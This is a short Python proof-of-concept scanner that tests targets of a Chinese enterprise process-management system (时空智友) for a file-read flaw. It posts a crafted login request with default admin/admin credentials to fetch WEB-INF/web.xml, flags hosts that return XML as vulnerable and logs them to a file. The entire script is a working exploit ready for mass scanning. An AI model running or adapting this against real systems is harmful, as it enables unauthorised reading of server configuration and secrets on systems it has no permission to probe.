import requests
import time
import buter
import wirtefile

filename = "./reps/时空智友企业流程化管控系统_login_文件读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
    }
poc = "/login"
data = "op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin"


def skzyfileread(url):
    try:
        reps = requests.post(url=url + poc, headers=headers, data=data, verify=False, timeout=5)
        if "<?xml" in reps.text and reps.status_code == 200:
            print(buter.colors.GREEN+  f"存在时空智友企业流程化管控系统_login_文件读取 url : {url}" + buter.colors.END)
            reptext = url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现时空智友企业流程化管控系统_login_文件读取 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
